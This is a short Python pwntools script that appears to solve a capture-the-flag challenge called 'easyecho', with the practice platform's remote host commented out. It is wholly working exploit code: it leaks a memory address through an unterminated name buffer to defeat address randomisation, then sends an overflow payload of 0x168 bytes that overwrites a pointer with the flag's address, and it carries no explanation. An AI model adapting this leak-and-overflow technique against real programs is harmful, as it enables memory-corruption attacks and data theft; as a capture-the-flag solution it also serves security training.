from pwn import *

context.log_level = 'info'

io = process("./easyecho")
#io = remote("node7.anna.nssctf.cn", 22422)

io.recvuntil(b"Name:")
io.send(b"a" * 0x10)
io.recvuntil(b"a" * 0x10)
leak_addr = u64(io.recv(6).ljust(8, b"\x00"))
base_addr = leak_addr - 0xcf0

flag_addr = base_addr + 0x202040
payload = b'a' * 0x168 + p64(flag_addr)

io.recvuntil(b"Input:")
io.sendline(b"backdoor")

io.recvuntil(b"Input:")
io.sendline(payload)

io.recvuntil(b"Input:")
io.sendline(b"exitexit")
io.interactive()
